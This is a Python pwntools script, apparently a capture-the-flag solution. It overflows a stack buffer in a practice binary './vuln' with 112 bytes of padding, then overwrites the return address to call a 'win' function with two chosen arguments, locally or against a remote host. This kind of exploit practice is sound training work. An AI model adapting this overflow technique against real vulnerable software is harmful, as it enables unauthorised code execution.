from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

exe = "./vuln"
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

io = start()
padding = 112

io.info("Address of 'win' function: " + hex(elf.symbols['win']))

payload = flat(
    b"A" * padding,
    elf.symbols['win'], # Address of 'win' function, which is the return address
    p32(0x0),           # Padding
    p32(0xCAFEF00D),    # Argument 1
    p32(0xF00DF00D)     # Argument 2
)

io.sendlineafter(b":",payload)

io.interactive()